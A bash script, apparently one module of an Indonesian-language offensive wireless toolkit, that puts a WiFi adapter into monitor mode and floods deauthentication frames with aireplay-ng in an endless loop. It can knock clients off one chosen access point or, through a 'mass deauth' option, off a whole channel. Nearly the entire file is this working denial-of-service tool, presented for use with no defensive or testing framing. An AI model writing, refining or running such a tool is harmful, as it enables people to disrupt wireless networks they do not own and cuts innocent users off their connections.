#!/usr/bin/env bash
# ============================================
#   MODULE: CHOKE THE HUNTERS (v11.0 Smart Device)
# ============================================

if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi

show_ascii() {
    clear
    echo -e "\033[38;2;255;215;0m"
    cat <<'ASCII'
██████╗██╗  ██╗ ██████╗ ██╗  ██╗███████╗    ████████╗██╗  ██╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ███████╗
██╔════╝██║  ██║██╔═══██╗██║ ██╔╝██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝
██║     ███████║██║   ██║█████╔╝ █████╗         ██║   ███████║█████╗      ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝███████╗
██║     ██╔══██║██║   ██║██╔═██╗ ██╔══╝         ██║   ██╔══██║██╔══╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗╚════██║
╚██████╗██║  ██║╚██████╔╝██║  ██╗███████╗       ██║   ██║  ██║███████╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║███████║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
ASCII
    echo -e "\033[0m\n"
}

detect_env() {
    IS_TERMUX=0
    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "com.termux"; then IS_TERMUX=1; fi
    if [ "$(id -u)" -eq 0 ]; then ROOT_MODE=1; STATUS_MSG="\033[1;32m[+] ROOT MODE ACTIVE\033[0m"; else ROOT_MODE=0; STATUS_MSG="\033[1;33m[!] NON-ROOT MODE\033[0m"; fi
}

pilih_interface() {
    echo -e "\n${C}=== DAFTAR INTERFACE WIFI ===${N}"
    local IFACES=($(iw dev 2>/dev/null | awk '/Interface/{print $2}'))
    if [ ${#IFACES[@]} -eq 0 ]; then echo -e "\033[0;31m[!] Tidak ada interface.\033[0m"; return 1; fi
    for i in "${!IFACES[@]}"; do
        local SUPPORT=$(iw phy $(iw dev ${IFACES[$i]} info 2>/dev/null | grep wiphy | awk '{print $2}') info 2>/dev/null | grep -q "monitor" && echo "[Support Monitor]" || echo "[No Monitor]")
        echo -e "  \033[1;32m[$((i+1))]\033[0m ${IFACES[$i]} \033[1;33m$SUPPORT\033[0m"
    done
    read -p "Pilih nomor interface (default 1): " IFACE_CHOICE; IFACE_CHOICE=${IFACE_CHOICE:-1}; IFACE=${IFACES[$((IFACE_CHOICE-1))]}; return 0
}

setup_monitor() {
    echo -e "\033[0;33m[*] Menyiapkan Monitor Mode...\033[0m"
    systemctl stop NetworkManager 2>/dev/null; nmcli radio wifi off 2>/dev/null; airmon-ng check kill >/dev/null 2>&1
    airmon-ng start "$IFACE" >/dev/null 2>&1
    
    # Cari interface monitor yang BARU dibuat oleh airmon-ng
    MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "mon" | head -n 1)
    if [ -z "$MON_IFACE" ]; then 
        # Kalau nggak nemu yang ada "mon"-nya, cek apakah IFACE asli udah berubah jadi monitor
        local TYPE=$(iw dev "$IFACE" info 2>/dev/null | grep type | awk '{print $2}')
        if [ "$TYPE" = "monitor" ]; then MON_IFACE="$IFACE"; else
            echo -e "\033[0;31m[!] GAGAL: Driver WiFi lo gagal masuk Monitor Mode.\033[0m"
            return 1
        fi
    fi
    
    echo -e "\033[0;32m[+] Monitor Mode Aktif di: $MON_IFACE\033[0m"
    return 0
}

cleanup() {
    echo -e "\n\033[0;33m[*] Memaksa proses berhenti...\033[0m"
    pkill -9 -f "aireplay-ng" 2>/dev/null
    if [ -n "$MON_IFACE" ]; then airmon-ng stop "$MON_IFACE" >/dev/null 2>&1; fi
    if [ -n "$IFACE" ]; then airmon-ng stop "$IFACE" >/dev/null 2>&1; fi
    systemctl restart NetworkManager 2>/dev/null; nmcli radio wifi on 2>/dev/null; svc wifi enable 2>/dev/null
}
trap cleanup SIGINT SIGTERM

# Fungsi Looping Deauth yang Pinter
loop_deauth() {
    local target_bssid="$1"
    local monitor_iface="$2"
    
    while true; do 
        # Simpen output error
        OUTPUT=$(aireplay-ng --deauth 10 -a "$target_bssid" "$monitor_iface" 2>&1)
        
        # Kalau error "No such device" atau "Invalid", STOP looping!
        if echo "$OUTPUT" | grep -qE "No such device|Invalid"; then
            echo -e "\n\033[0;31m[!] CRITICAL ERROR: Hardware/Driver menolak!\033[0m"
            echo -e "\033[0;33m    Log: $(echo "$OUTPUT" | grep -E "No such device|Invalid" | head -n 1)\033[0m"
            kill -9 $$ # Bunuh script ini biar nggak nge-loop error
        fi
        
        sleep 0.5
    done
}

while true; do
    show_ascii; detect_env
    echo -e "${C}======================================================${N}"
    echo -e "${W}    SMART DEAUTH ATTACK ENGINE${N}"
    echo -e "    Status: $STATUS_MSG"
    echo -e "${C}======================================================${N}"
    echo ""
    if [ "$ROOT_MODE" -eq 1 ] && [ "$IS_TERMUX" -eq 0 ]; then
        echo -e "  \033[1;32m[1]\033[0m  \033[1;37mTargeted Deauth (1 BSSID)\033[0m"
        echo -e "  \033[1;32m[2]\033[0m  \033[1;37mUltimate Mass Deauth (Semua Client)\033[0m"
    else
        echo -e "  \033[1;30m[1] Targeted Deauth (Requires PC & Root)\033[0m"
        echo -e "  \033[1;30m[2] Mass Deauth (Requires PC & Root)\033[0m"
    fi
    echo ""; echo -e "  \033[1;31m[0]\033[0m  \033[1;37mBack to Main Menu\033[0m"; echo ""
    echo -e "${C}------------------------------------------------------${N}"; echo -ne "  ${Y}Select option > ${N}"
    read -r choke_choice

    if [ "$choke_choice" = "1" ] || [ "$choke_choice" = "2" ]; then
        if [ "$IS_TERMUX" -eq 1 ]; then echo -e "\n\033[0;31m[!] DITOLAK: Termux butuh USB Adapter.\033[0m"; read -p "Press Enter..."; continue; fi
        if [ "$ROOT_MODE" -eq 0 ]; then echo -e "\n\033[0;31m[!] DITOLAK: Butuh Root (sudo).\033[0m"; read -p "Press Enter..."; continue; fi
    fi

    case "$choke_choice" in
        1)
            pilih_interface || { read -p "Press Enter..."; continue; }
            while true; do
                read -p "Masukkan BSSID Target: " BSSID
                if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then break; else echo -e "\033[0;33m[*] Format BSSID salah (harus 6 blok).\033[0m"; fi
            done
            read -p "Masukkan Channel Target: " CHAN
            
            setup_monitor || { read -p "Press Enter..."; continue; }
            iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
            
            echo -e "\n${R}[*] INFINITE DEAUTH KE $BSSID...${N}"
            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
            
            # Jalanin fungsi pinter di background
            loop_deauth "$BSSID" "$MON_IFACE" &
            LOOP_PID=$!
            
            read -r
            kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
            cleanup; read -p "Press Enter to continue..."
            ;;
        2)
            pilih_interface || { read -p "Press Enter..."; continue; }
            read -p "Masukkan Channel Target: " CHAN
            
            setup_monitor || { read -p "Press Enter..."; continue; }
            iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
            
            echo -e "\n${R}[*] ULTIMATE MASS DEAUTH DI CHANNEL $CHAN...${N}"
            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
            
            loop_deauth "FF:FF:FF:FF:FF:FF" "$MON_IFACE" &
            LOOP_PID=$!
            
            read -r
            kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
            cleanup; read -p "Press Enter to continue..."
            ;;
        0) exit 0 ;;
        *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
